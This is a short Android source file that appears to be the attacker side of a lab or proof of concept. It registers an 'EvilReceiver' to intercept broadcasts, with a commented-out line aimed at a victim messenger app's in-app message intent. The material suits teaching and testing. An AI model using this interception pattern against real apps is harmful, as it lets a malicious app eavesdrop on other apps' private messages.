package com.example.implicit.intents.interception;

import androidx.appcompat.app.AppCompatActivity;
import android.content.BroadcastReceiver;
import android.content.IntentFilter;
import android.os.Bundle;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        BroadcastReceiver br = new EvilReceiver();
//        final String ACTION = "com.victim.messenger.IN_APP_MESSAGE";
        final String ACTION = "android.intent.action.CLOSE_SYSTEM_DIALOGS";
        IntentFilter filter = new IntentFilter(ACTION);
        filter.addCategory("android.intent.category.DEFAULT");
        getApplicationContext().registerReceiver(br, filter);

        // Insert here new receiver ...
    }
}